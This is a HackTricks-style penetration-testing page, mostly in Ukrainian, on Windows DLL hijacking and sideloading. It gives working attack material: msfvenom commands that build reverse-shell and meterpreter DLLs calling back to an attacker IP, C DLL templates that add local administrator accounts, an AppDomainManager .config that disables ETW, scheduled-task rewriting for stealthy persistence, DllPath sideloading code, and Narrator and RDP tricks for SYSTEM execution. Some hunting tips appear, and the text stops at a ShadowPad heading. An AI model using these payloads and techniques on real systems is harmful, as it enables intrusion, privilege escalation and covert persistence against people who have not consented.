# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking передбачає маніпуляцію довіреною програмою, щоб вона завантажила шкідливий DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection, and Side-Loading**. Його головним чином використовують для виконання коду, досягнення persistence і, рідше, privilege escalation. Попри фокус на escalation тут, метод hijacking залишається однаковим для всіх цілей.

### Common Techniques

Для DLL hijacking використовують кілька методів, і ефективність кожного залежить від стратегії завантаження DLL у застосунку:

1. **DLL Replacement**: Підміна справжнього DLL на шкідливий, за потреби з використанням DLL Proxying, щоб зберегти функціональність оригінального DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливого DLL у шляху пошуку перед легітимним, використовуючи схему пошуку застосунку.
3. **Phantom DLL Hijacking**: Створення шкідливого DLL для завантаження застосунком, який вважає його неіснуючим потрібним DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, таких як `%PATH%` або файли `.exe.manifest` / `.exe.local`, щоб спрямувати застосунок на шкідливий DLL.
5. **WinSxS DLL Replacement**: Підміна легітимного DLL на шкідливий у каталозі WinSxS, метод, який часто пов'язують із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливого DLL у каталозі, контрольованому користувачем, разом зі скопійованим застосунком, що нагадує техніки Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Класичний DLL sideloading — не єдиний спосіб змусити довірений процес **.NET Framework** завантажити код атакувальника. Якщо цільовий виконуваний файл є **managed** застосунком, CLR також перевіряє **application configuration file**, названий на честь виконуваного файла (наприклад `Setup.exe.config`). Цей файл може визначати власний **AppDomainManager**. Якщо config вказує на assembly під контролем атакувальника, розміщений поруч із EXE, CLR завантажує його **before the application's normal code path** і виконує всередині довіреного процесу.

Згідно зі схемою конфігурації Microsoft .NET Framework, для використання custom manager мають бути присутніми і `<appDomainManagerAssembly>`, і `<appDomainManagerType>`.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Practical notes:
- Це **.NET Framework specific** tradecraft. Воно залежить від парсингу CLR config, а не від Win32 DLL search order.
- Хост має бути саме **managed EXE**. Швидка перевірка: `sigcheck -m target.exe`, `corflags target.exe`, або перевірка наявності **CLR Runtime Header** у PE metadata.
- Ім’я config-файлу має точно збігатися з ім’ям executable (`<binary>.config`) і зазвичай лежить **поруч із EXE**.
- Це корисно з **signed Microsoft/vendor binaries**, бо trusted EXE лишається без змін, а malicious managed assembly виконується in-process.
- Якщо в тебе вже є writable installer/update directory, AppDomainManager hijacking можна використати як **first stage**, а далі — classic DLL sideloading або reflective loading для наступних stage.

### Hijacking an existing scheduled task to relaunch the sideload chain

Для persistence не варто дивитися лише на **створення нового task**. Деякі intrusion sets чекають, поки legitimate installer створить **normal updater task**, а потім **переписують task action**, щоб existing name, author і trigger залишалися знайомими для defenders.

Reusable workflow:
1. Встанови/запусти legitimate software і визнач task, який він зазвичай створює.
2. Export task XML і зверни увагу на поточні значення `<Exec><Command>` / `<Arguments>`.
3. Заміни лише action, щоб task запускав твій **trusted host EXE** з user-writable staging directory, який потім side-loads або AppDomain-loads real payload.
4. Re-register той самий task name замість створення нового очевидного persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Чому це менш помітно:
- Назва task може й далі виглядати легітимною, наприклад як у updater від vendor.
- **Task Scheduler service** запускає її, тож перевірка parent/ancestor часто бачить очікуваний scheduling chain замість `explorer.exe`.
- Команди DFIR, які шукають лише **нові task names**, можуть пропустити task, чия реєстрація вже існувала, але action тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях під контролем attacker.

Швидкі hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте `C:\Windows\System32\Tasks\*` XML і метадані `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з baseline.
- Сигналізуйте, коли **vendor-looking updater task** виконується з **user-writable directories** або запускає .NET EXE з розміщеним поруч `*.config` файлом.

> [!TIP]
> Для покрокового chain, який поєднує HTML staging, AES-CTR configs і .NET implants поверх DLL sideloading, перегляньте workflow нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Найпоширеніший спосіб знайти missing Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals, **встановивши** **такі 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

і показати лише **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **missing dlls загалом**, залиште це працювати на кілька **seconds**.\
Якщо ви шукаєте **missing dll inside an specific executable**, слід встановити **інший filter, наприклад "Process Name" "contains" `<exec name>`, запустити його і зупинити capture events**.

## Exploiting Missing Dlls

Щоб підвищити привілеї, найкращий шанс — це мати змогу **записати dll, яку privileged process спробує завантажити**, у **місце, де її будуть шукати**. Тому ми зможемо **записати** dll у **folder**, де **dll шукають раніше**, ніж folder, де знаходиться **original dll** (weird case), або зможемо **записати в some folder, де dll буде шукатися**, а original **dll** не існує в жодному folder.

### Dll Search Order

**У** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти, як саме завантажуються Dlls.**

**Windows applications** шукають DLLs за **pre-defined search paths**, дотримуючись певної послідовності. Проблема DLL hijacking виникає тоді, коли шкідлива DLL стратегічно розміщена в одному з цих каталогів, щоб її завантажили раніше за справжню DLL. Один зі способів запобігти цьому — змушувати application використовувати absolute paths під час звернення до потрібних DLLs.

Нижче наведено **DLL search order on 32-bit** systems:

1. Каталог, з якого було завантажено application.
2. System directory. Використовуйте функцію [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати шлях до цього каталогу.(_C:\Windows\System32_)
3. 16-bit system directory. Немає функції, яка отримує шлях до цього каталогу, але він перевіряється під час пошуку. (_C:\Windows\System_)
4. Windows directory. Використовуйте функцію [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати шлях до цього каталогу.
1. (_C:\Windows_)
5. Поточний каталог.
6. Каталоги, перелічені в змінній середовища PATH. Зверніть увагу, що це не включає per-application path, вказаний у registry key **App Paths**. Ключ **App Paths** не використовується під час обчислення DLL search path.

Це **default** search order із увімкненим **SafeDllSearchMode**. Коли його вимкнено, current directory піднімається на друге місце. Щоб вимкнути цю функцію, створіть значення registry **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (default — увімкнено).

Якщо функцію [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликано з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в каталозі executable module, який **LoadLibraryEx** завантажує.

Нарешті, зауважте, що **dll може бути завантажена із зазначенням absolute path, а не лише name**. У такому разі цю dll **будуть шукати лише в цьому шляху** (якщо у dll є dependencies, їх шукатимуть так, ніби вона була щойно завантажена за name).

Є й інші способи змінювати search order, але тут я їх не пояснюватиму.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Використайте **ProcMon** filters (`Process Name` = target EXE, `Path` закінчується на `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати назви DLL, які process перевіряє, але не може знайти.
2. Якщо binary запускається за **schedule/service**, то розміщення DLL з однією з цих назв у **application directory** (search-order entry #1) призведе до її завантаження під час наступного запуску. В одному випадку зі .NET scanner process шукав `hostfxr.dll` у `C:\samples\app\` ще до завантаження справжньої копії з `C:\Program Files\dotnet\fxr\...`.
3. Зберіть payload DLL (наприклад, reverse shell) з будь-яким export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваша primitive — це **ZipSlip-style arbitrary write**, створіть ZIP, entry якого виходить за межі extraction dir, щоб DLL потрапила в app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів до спостережуваної inbox/share; коли scheduled task перезапустить процес, він завантажить malicious DLL і виконає ваш code як service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Advanced way to deterministically вплинути на DLL search path newly created process — set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад операційного використання
- Розмістіть malicious xmllite.dll (exporting потрібні функції або proxying до справжньої) у вашому каталозі DllPath.
- Запустіть signed binary, який, як відомо, шукає xmllite.dll за іменем, використовуючи наведену вище техніку. Loader розв’язує import через наданий DllPath і sideloads вашу DLL.

Цю technique спостерігали в-the-wild для побудови multi-stage sideloading chains: початковий launcher скидає helper DLL, який потім запускає Microsoft-signed, hijackable binary з custom DllPath, щоб примусово завантажити DLL зловмисника з staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

Для цілей **.NET Framework** sideloading можна виконати **до `Main()`** без patching memory, зловживаючи сусіднім **`.exe.config`** файлом застосунку. Замість того щоб покладатися лише на Win32 DLL search order, attacker розміщує легітимний .NET EXE поруч із malicious config та одним або кількома assemblies під своїм контролем.

Як працює chain:
1. Host EXE запускається, і **CLR reads `<exe>.config`**.
2. Config встановлює **`<appDomainManagerAssembly>`** і **`<appDomainManagerType>`**, тож runtime instantiates attacker-controlled `AppDomainManager`.
3. Malicious manager отримує **pre-`Main()` execution** всередині trusted host process.
4. Той самий config може змусити CLR спочатку resolve local assemblies first (наприклад `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) і може послабити runtime validation/telemetry без inline patching.

Campaign-style pattern (точне вкладення може відрізнятися залежно від directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Чому це корисно:
- **`<probing privatePath="."/>`** keeps assembly resolution in the application directory, перетворюючи folder на передбачувану sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** переносять execution в attacker code під час CLR initialization, before the legitimate app logic runs.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** can let a full-trust app load unsigned or tampered assemblies without a strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** avoids publisher-policy redirects to newer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** робить runtime selection більш deterministic.
- **`<etwEnable enabled="false"/>`** is especially interesting because the **CLR disables its own ETW visibility** from configuration instead of the implant patching `EtwEventWrite` in memory.

Operational pattern seen in recent campaigns:
- Stage 1 drops `setup.exe`, `setup.exe.config`, and local assemblies.
- Stage 2 copies them into a believable **AppData update** folder, renames the host to something like `update.exe`, and relaunches it via a **scheduled task**.
- Stage 3 verifies execution context (for example expected parent `svchost.exe` from Task Scheduler) before loading the final RAT DLL/export.

Hunting ideas:
- Signed or otherwise legitimate **.NET executables** running with suspicious adjacent **`.config`** files in user-writable locations.
- `.config` files containing **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, or **`etwEnable enabled="false"`**.
- Scheduled tasks that relaunch renamed update binaries from **`%LOCALAPPDATA%`** or app-specific `\bin\update\` directories.
- Parent/child chains where a scheduled task launches a trusted .NET host that immediately loads non-vendor assemblies from its own directory.

#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте permissions усіх folders всередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Можна також перевірити imports executable і exports dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створення користувача (x86, я не бачив версії x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зверніть увагу, що в кількох випадках Dll, яку ви компілюєте, повинна **експортувати кілька функцій**, які буде завантажувати процес-жертва; якщо цих функцій не існує, **бінарний файл не зможе їх завантажити**, і **експлойт зазнає невдачі**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативний C DLL з thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe все ще перевіряє передбачувану, мовно-специфічну localization DLL під час запуску, яку можна hijack для arbitrary code execution і persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Наївний hijack буде говорити/підсвічувати UI. Щоб залишатися тихо, після attach перерахуй потоки Narrator, відкрий головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і `SuspendThread` його; продовжуй у своєму потоці. Див. PoC для повного коду.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З вищевказаним, запуск Narrator завантажує planted DLL. На secure desktop (logon screen) натисни CTRL+WIN+ENTER, щоб запустити Narrator; твій DLL виконається як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозволь classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP до хоста, на logon screen натисни CTRL+WIN+ENTER, щоб запустити Narrator; твій DLL виконається як SYSTEM на secure desktop.
- Виконання зупиняється, коли RDP session закривається—inject/migrate швидко.

Bring Your Own Accessibility (BYOA)
- Ти можеш клонувати вбудований запис Accessibility Tool (AT) у registry (наприклад, CursorIndicator), відредагувати його так, щоб він вказував на arbitrary binary/DLL, імпортувати його, а потім встановити `configuration` на цю назву AT. Це проксіює arbitrary execution через framework Accessibility.

Notes
- Запис у `%windir%\System32` і зміна значень HKLM потребує admin rights.
- Уся логіка payload може бути в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей кейс демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), відстежуваний як **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Як стандартний користувач, скиньте `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся, поки запуститься заплановане завдання о 9:30 AM у контексті поточного користувача.
3. Якщо під час виконання завдання залогінений administrator, шкідливий DLL запуститься в сесії administrator на medium integrity.
4. Поєднайте стандартні техніки UAC bypass, щоб підвищити привілеї з medium integrity до SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors часто поєднують MSI-based droppers з DLL side-loading, щоб виконувати payloads під довіреним, signed процесом.

Chain overview
- Користувач завантажує MSI. CustomAction тихо запускається під час GUI install (наприклад, LaunchApplication або VBScript action) і відновлює наступний stage з embedded resources.
- Dropper записує легітимний, signed EXE та шкідливий DLL у той самий каталог (приклад пари: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Коли запускається signed EXE, Windows DLL search order спочатку завантажує wsc.dll з working directory, виконуючи attacker code під signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Шукайте записи, які запускають executables або VBScript. Приклад підозрілого pattern: LaunchApplication, що виконує embedded file у background.
- В Orca (Microsoft Orca.exe) перевірте CustomAction, InstallExecuteSequence і Binary tables.
- Embedded/split payloads у MSI CAB:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Або використайте lessmsi: `lessmsi x package.msi C:\out`
- Шукайте кілька малих fragments, які конкатенуються та decrypt-яться VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичний sideloading з wsc_proxy.exe
- Помістіть ці два файли в ту саму теку:
- wsc_proxy.exe: легітимний signed host (Avast). Процес намагається завантажити wsc.dll за іменем зі своєї теки.
- wsc.dll: DLL зловмисника. Якщо не потрібні конкретні exports, може вистачити DllMain; інакше зберіть proxy DLL і перенаправляйте потрібні exports до справжньої бібліотеки, запускаючи payload у DllMain.
- Зберіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для export requirements використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця technique покладається на DLL name resolution з боку host binary. Якщо host використовує absolute paths або safe loading flags (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на precedence і їх потрібно враховувати під час вибору host binary та export set.

## Signed triads + encrypted payloads (ShadowPad case study)

